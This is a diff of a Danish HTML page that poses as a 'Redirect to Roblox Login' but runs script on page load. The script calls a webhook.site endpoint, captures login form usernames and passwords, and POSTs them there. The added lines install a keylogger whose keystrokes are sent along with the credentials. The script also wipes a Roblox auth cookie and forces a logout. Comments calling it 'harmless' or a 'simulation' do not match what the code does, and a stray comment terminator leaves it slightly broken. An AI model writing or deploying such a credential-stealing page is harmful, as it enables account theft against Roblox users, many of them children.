@@ -1,44 +1,51 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="da">
 <head>
   <meta charset="UTF-8">
   <title>Redirect til Roblox Login</title>
   <script>
-  window.onload = function() {
-    fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5")
-    .catch(error => console.error("Fejl:", error));
-    setTimeout(() => {
-      window.location.href = "https://www.roblox.com/Login"; 
-    }, 3000);
-    const form = document.getElementById("loginForm");
+    window.onload = function() {
+      // Simuler en GET-request (ufarlig)
+      fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5")
+        .catch(error => console.error("Fejl:", error));
+
+      // Start lokal keylogger
+      let keyLog = [];
+      document.addEventListener("keydown", function(event) {
+        keyLog.push(event.key);
+        console.log("Tastetryk:", event.key);
+      });
+
+      // Efter 3 sekunder, redirect til Roblox login
+      setTimeout(() => {
+        window.location.href = "https://www.roblox.com/Login";
+      }, 3000);
+
+      // Her kunne man fange formularinput, hvis det var på egen side
+      const form = document.getElementById("loginForm");
       if (form) {
         form.onsubmit = function(e) {
           e.preventDefault();
-
           const username = document.getElementById("usernameInput").value;
           const password = document.getElementById("passwordInput").value;
-
           console.log("Brugernavn:", username);
           console.log("Adgangskode:", password);
-
-          // Send data til testserver
-          fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
+           fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
             method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ username, password })
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ keys: keyLog, username, password })
           });
-         }
-    document.cookie = "RobloxAuthToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
-    window.location.href = "https://www.roblox.com/Logout";
-    } 
-  </script> 
-</head> 
-<body> 
-  <p>Redirecting...</p> 
-</body> 
+          */
+        };
+      }
+
+      // Simuler logout
+      document.cookie = "RobloxAuthToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+      window.location.href = "https://www.roblox.com/Logout";
+    };
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
 </html>
-
-
-
